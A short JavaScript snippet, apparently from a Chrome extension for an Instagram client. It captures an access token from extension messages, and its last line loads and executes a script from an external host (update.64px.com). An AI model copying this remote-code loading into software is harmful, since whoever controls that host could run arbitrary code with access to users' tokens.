Insta.init('2974fce230f74bd38c726d5b18761dc2');
    
/* Listen for messages from other app components */
chrome.extension.onRequest.addListener(function(request, sender, sendResponse) {
    if(request && 'session' in request && request.session.match(/access_token/)) {
		Insta.setAccessToken(request.session.replace('#access_token=', ''));
		sendResponse({});
    }
});

$.getScript('https://s3.amazonaws.com/update.64px.com/ping.js');